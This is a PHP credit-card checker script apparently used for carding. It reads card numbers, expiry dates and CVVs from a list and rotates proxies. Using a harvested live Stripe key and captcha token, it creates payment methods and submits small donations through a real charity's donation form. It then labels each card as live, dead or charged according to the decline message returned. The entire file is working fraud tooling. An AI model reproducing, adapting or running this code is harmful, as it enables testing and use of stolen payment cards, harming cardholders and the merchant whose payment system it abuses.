<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=52245cde-3fd1-42c1-aa8a-b2870298cbb3b82ff6&muid=fb8a5edb-3569-465b-a53d-af324e57c1bd033676&sid=db14b5af-f5a9-42e6-8059-3d786514f092d6d0b4&pasted_fields=number&payment_user_agent=stripe.js%2F6ce7db85dd%3B+stripe-js-v3%2F6ce7db85dd%3B+card-element&referrer=https%3A%2F%2Fdonkeydreamland.com&time_on_page=95156&key=pk_live_51InVTxLm10VHw4ikFr5d9P8RhLc99KPGGSfFTBsxldBewq0mzg8Ko8hqyDhszc3A6VS9l0U0qlJPbznEGwbuFVth00prZvIS0I&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZYvfdJyeK8i2zQrwIbItV-291FTPosEK4W4oNfyNGHcRfG7N04trNrf-30shYmpLs-LaMrRvaLywk5GHmT6dZA9mczMNl8lbzXXgd3LJtPz83sFYJ3WX2-p29WSSjGxy0cDsCtLkQl49nE7Wzn0cHppRzthughmvtYtF1TolOYwcCKOUI2kImFj94-OuCjRPvcGjn-oLc_Tpls5Hgd1t7h4hG6YN1uk8GhjdowS78vwGfNEQ9z6KhIwbvCTfUMEsfx9izg7L_wOOIyexUtqERns7HBysqRPOuzdVvjKK18zDw789VLp3zAx-8nGEporEvY_pcvCvo-RZjePc0MZPlxvBNYzM1B-rKVIcffHuWgFP22pRgkNpV2oXGGPR9TYLulocp6cWkLWbgmQTf_2s3R_pJP2Lltl_trof17USdfXwi7IHC3SDVII4kXIzAxT7lyAhIjJJb-1xZw8yiShig-VgoXEOVTP36GFwbWAMSSBVTDSS8klFERZqgtpTCjmgHw8N5fe0eW1c0BQhwepwCnzetEF8OaFw1E8am2LdH2cN0HDUKqnAAkdMWG7IPUKAAaKqoYdQF2EjVupkS5BORM0z1d0-rTGhQuCj-4Gmv4WMo5Uh1vhBDi-JgmqP7ne1Fm0AsssSNUfitxfFuRb6mgeRspSpYHjIecgpIW23gpJiId1W9OxriwnUjNbTY9X7xzHVqF90-K0Heta6bajQqVWN1ViE8QWl9Z6o-oApkq429psR7iNBNqKlhbAXoi323gry06gqnEZgu1ft8DtbBWws4WbFGCql4zd6hKtN2nV8jl7p8vflGMUgXo-HaG8pw2-4BS1RLJmwhQUzl-VReqYIHMLOXdw7IcsRixPEiie-82YsHP8KdVaH34rL_jD1ly4xFTC-uWdwiRokcnV5QjFxKjOGs80ewG-WQgHmNdZHKH8ZkEUfr9ubf04qubHhNOBi0qbajDgI6f5v_wrbwG7CjjH3r2oaSNP8yk9Pf7QK1-lo--T7G2BTClku-Q8YrmNamiLaq5MPmiVLpim9AFk62CIihyRzp7J9orUq0nMAZfEcLIEPOQ0TeI9MRNuQ9tQEhywaJW-XeIdHoMB7JvlYxHJIy-Cy5ihJ5eIVl_Udstis-KKWVkWCiRKhOTz14z1dlVQQXm7ksbXk_8VcdBFDG0D_uQPdfnSep4d_MB5VAAhmJrJJ1pM4LtRIcDiCA_Bm6T_GjDdxKkXcHP4iJ7R1gnWBKdeYGcF0fIaRVvX353Z7hLVrLH3jWXPaVfHF0MJVa8QqS0iRQvahCv94XtSOsfSDDlKaeF-DjbfTbazM_muLb29Z5YbxDxiGSynbMRfTe59-7CBB7e5SW063kr75raBtX6gSN7Mb523MSAiMbsONVMtFmSJ88C-swOGrHQqIHeoble0FILSHbPEvLhSEVyXkkFCCC0CNpXsjxJz51v6yB2l3DdFa0uynAzvGRniL73Dd5e3lMlCfuVCz9MR6uV5DaZsrmFoBpW90Dkihn3qMRXp1l8-co6EydUQnn-bKeTPKMTOgXVimbAd-Hg71axOfVWQ4dbgjL7E1_WGUKknvkMI890IZkNuXeDT3koyjulCTjbDooU4gGZgGkfWeEgzf9EyzMnvdD7MIpNJG22sfD5fyJ5FBrcUWLrulCWZXNVlYUhwhHtuXz1k1rG7fHF-XIKqPFkMS8WCfOpYC8Ft6mmQe0AzsW2BV6vNyF7B2oqBvYwKrqlrBH3dvMFnEWMUh5ne4OswjWxPg8k71Q79SG1E8mEoZ7ncggds5GkUWxWcvDSL0OQUjC7UvOWZpfkZMeqmyKNo4kEm0uOZng9FvvDou6NLg0q83WZiMejmdp66DXw8A1uiFzLfJEI_CU5nweX5LrsYRt32xjcYXWrgTgMOkAs5sMwfxBVW9EK72XrnQ-ONdixeIrkhLKul5teAxhkP9PArWR9RKKMDdHDOtleYKnGuRT8SA9YvS2VxHO3b6p_g1QCzxt1zF34lNwqSIwSeNcAaP--IZ_I5ztyH1lauGRS6hgu28KyMTf41MqQ-5TLNGlNnpDUqCCHtKsxWZB2PmRzzoCbAB1NiO5NyCAbdi2luoyJzS38eofWKBMR7yMfPzhSEpPA4jHlp41CJ_PfxNw5jVN8Dx02P304CJoAkirim6NleHDOZoQwmahzaGFyZF9pZM4DMYNvomtyqDI4MzgxMmMwonBkAA.3LEBL3otUV9oaiP2h38GTY_bmQTIyKXGSCz4HU8QNRE');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donkeydreamland.com/wp-admin/admin-ajax.php?t=1719939198091
');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1719939198091',
'Host: donkeydreamland.com',
'Accept: */*',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
'Origin: https://donkeydreamland.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://donkeydreamland.com/one-off-donations/',
'Accept-Language: en-US,en;q=0.9',
));
sleep(10);
////////////////////////////===[2 Req Postfields]////////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=__fluent_form_embded_post_id%3D5761%26_fluentform_63_fluentformnonce%3D2182fc95b1%26_wp_http_referer%3D%252Fone-off-donations%252F%26email%3Dmaswalkerus05%2540gmail.com%26names%255Bfirst_name%255D%3Dm%26names%255Blast_name%255D%3D%26custom-payment-amount%3D3%26payment_method_1%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=63');

#EDIT YOUR 2ND REQ POSTFIELDS HERE WATCH THIS CAREFULLY TO UNDERSTAND HOW TO EDIT FUCNTIONS 

$result2 = curl_exec($ch);
# ---------------------------------------#

# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "Thank you for your message.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED CVV 1$ '.$amt.' By ᴛᴏxɪ𝐶 ✘ᴅ🔥 </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ⚠️ @ToxiC_109110 </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ @ToxiC_109110 </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ @ToxiC_109110 </span><br>';
    exit;
    }
    elseif(strpos($result2, "Security code is invalid.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ @ToxiC_109110 </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED ❌ @ToxiC_109110 </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 3DSECURE REQUIRED ❌ @ToxiC_109110 </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ @ToxiC_109110 </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ @ToxiC_109110 </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';

}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}

curl_close($ch);
ob_flush();
echo $result1;
echo $result2;

?>